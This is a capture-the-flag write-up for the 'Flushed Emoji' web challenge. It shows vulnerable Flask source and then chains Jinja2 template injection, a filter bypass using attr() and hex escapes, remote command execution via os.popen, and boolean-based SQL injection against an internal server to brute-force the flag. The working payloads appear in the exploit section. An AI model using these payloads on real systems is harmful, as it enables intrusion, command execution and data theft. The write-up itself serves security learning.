# Flushed Emoji

```
score: 198      
solved: 49/xxx      
difficulty: medium      
tags: web, ssti, sqli       
```

## Problem

Flushed emojis are so cool! Learn more about them here!

[FlushedEmojis.zip](./FlushedEmojis.zip)

## Read source code
Have 2 sources code
1. main-server
- Have only endpoint(/login) 

```py
    if('.' in password):
      return render_template_string("lmao no way you have . in your password LOL");

    r = requests.post('[Other server IP]', json={"username": alphanumericalOnly(username),
    "password": alphanumericalOnly(password)}); 
    if(r.text == "True"):
      return render_template_string("OMG you are like so good at guessing our flag I am lowkey jealoussss.");
    return render_template_string("ok thank you for your info i have now sold your password (" + password + ") for 2 donuts :)");
```
- templates/login.html


```html
    {% if error %}
        <p class="error"><strong>Error:</strong> {{ error }}
    {% endif %}
```
Username and password are sent to another server and are filted by alphanumericalOnly But can see they use render_template_string. Can a SSTI -> Flask use Jinja2 -> Send password '7'*7 and response is 7777777 -> bypass filter '.' 


2. data-server

```py
app.route('/runquery', methods=['POST'])
def runquery():
  request_data = request.get_json()
  username = request_data["username"];
  password = request_data["password"];

  print(password);
  
  cur.execute("SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'");

  rows = cur.fetchall()
  if(len(rows) > 0):
    return "True";
  return "False";
```
-  In the endpoint /runquery has the function of login through method post but It exists a boolean-base sqli.
- data=flag' or password like '%' -- -     => True
- data=flag' or password like 'A%' -- -    => False

## Exploit 
1. Flow
SSTI -> RCE  -> Request data-server -> boolean-base sqli. 

2. SSTI     
### Bypass filter
[Read link](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#user-content-jinja2---filter-bypass)

I use config|attr('items')() --> Pass

### SSTI to RCE 
{{ (config|attr('from_object'))('os') }}        
{{((config|attr('__class__')|attr('__init__')|attr('__globals__'))['os']|attr('popen'))('whoami')|attr('read')()}} -> user

3. RCE to SQLI
### Run a command python
```py
import requests; 
print(requests.post("http://172.24.0.8:8080/runquery", headers={"Content-Type": "application/json"}, data=bytes.fromhex("{Hexdata}").decode("utf-8")).text)
```
For bypass fil;ter '.' use \x2e and ' = \x27, " = \x22

### Run sqli 
flag' and password like 'char%' ESCAPE '@' -- - -> encode hex
Use ESCAPE '@' for char '_' not is a Wildcard (like sql) [readmore](https://stackoverflow.com/questions/5139770/escape-character-in-sql-server#answer-14518639)

Result is True or False.

If result char sqli is '_', not sure if it's correct [readmore](https://www.w3schools.com/mysql/mysql_wildcards.asp)


### Payload is:
```py
query = "flag' and password like 'LITCTF%' ESCAPE '@' -- -"
query = json.dumps({"username": query, "password": "b"}).encode().hex()
query = '''{{((config|attr('__class__')|attr('__init__')|attr('__globals__'))['os']|attr('popen'))('python3 -c \\x27import requests; print(requests\\x2epost(\\x22http://172\\x2e24\\x2e0\\x2e8:8080/runquery\\x22, headers={\\x22Content-Type\\x22: \\x22application/json\\x22}, data=bytes\\x2efromhex(\\x22''' +query  + '''\\x22)\\x2edecode(\\x22utf-8\\x22))\\x2etext)\\x27')|attr('read')()}}'''
data= {"username":'a', "password": query}
```
## Brute Forces flag 

Full solving code at [Flushed_Emoji.py](./Flushed_Emoji.py)

We got the flag: `LITCTF{flush3d_3m0ji_o.0}`.
